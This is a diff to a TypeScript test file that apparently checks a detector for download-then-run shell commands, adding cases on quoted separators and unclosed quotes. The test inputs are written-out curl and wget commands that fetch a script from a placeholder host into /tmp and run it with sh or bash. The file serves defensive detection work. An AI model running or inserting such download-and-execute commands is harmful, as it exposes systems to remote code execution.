@@ -160,6 +160,12 @@ describe("Vercel review of the performance commit", () => {
     expect(findExecPatterns("echo curl \\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).toContain("download-then-run");
     expect(findExecPatterns("curl x \\\\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).not.toContain("download-then-run");
   });
+  it("01M81HKWG8PMBSDPD6CXAYQZDW: separators inside quotes do not split a command", () => {
+    for (const t of ['curl -H "X: a\\>&b" -o /tmp/a https://x.invalid && sh /tmp/a', "curl -H 'X: a;b|c&d' -o /tmp/a https://x.invalid && sh /tmp/a"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
+  });
+  it("an unclosed quote ends at the line, so it cannot hide the lines after it", () => {
+    expect(findExecPatterns('echo "unclosed\ncurl -o /tmp/a https://x.invalid && sh /tmp/a').map((h) => h.rule)).toContain("download-then-run");
+  });
   it("01M81GX5A9BKY6BCFZMZ8N3CCT: a redirection's & does not split the command", () => {
     for (const t of ["curl https://x.invalid 2>&1 -o /tmp/a && sh /tmp/a", "curl https://x.invalid &>/dev/null -o /tmp/a; bash /tmp/a"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
   });
